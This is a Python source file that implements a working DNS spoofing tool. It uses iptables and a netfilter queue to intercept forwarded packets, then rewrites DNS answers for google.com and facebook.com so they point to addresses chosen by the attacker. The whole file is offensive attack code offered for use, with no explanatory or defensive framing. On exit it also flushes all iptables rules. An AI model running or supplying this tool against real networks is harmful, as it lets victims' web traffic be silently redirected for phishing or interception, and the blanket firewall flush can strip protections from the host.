from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal 


class Dnsspoof(object):
	DNS_HOSTS = {
		b"www.google.com.": "192.168.1.100",
		b"google.com.": "192.168.1.100",
		b"facebook.com.": "172.217.19.142"
	}

	def _process_pkt(self, pkt):
		scapy_pkt = IP(pkt.get_payload())
		if scapy_pkt.haslayer(DNSRR):
			print('[Before]:', scapy_pkt.summary())
			try:
				scapy_pkt = self._modify_pkt(scapy_pkt)
			except IndexError:
				pass
			print('[After ]:', scapy_pkt.summary())
			pkt.set_payload(bytes(scapy_pkt))
		pkt.accept()

	def _modify_pkt(self, pkt):
		qname = pkt[DNSQR].qname
		if qname not in self.DNS_HOSTS:
			print("no modification:", qname)
			return pkt
		pkt[DNS].an = DNSRR(rrname=qname, rdata=self.DNS_HOSTS[qname])
		pkt[DNS].ancount = 1
		del pkt[IP].len
		del pkt[IP].chksum
		del pkt[UDP].len
		del pkt[UDP].chksum
		return pkt

	def run(self):
		print('[*] Starting DNS Poisoning service!')
		QUEUE_NUM = 0
		os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(QUEUE_NUM))  # insert the iptables FORWARD rule
		try:
			queue = NetfilterQueue()  # instantiate the netfilter queue
			queue.bind(QUEUE_NUM, self._process_pkt)
			queue.run()
		except KeyboardInterrupt:
			print('[!] KeyboardInterrupt detected! Flushing iptables')
			os.system("iptables --flush")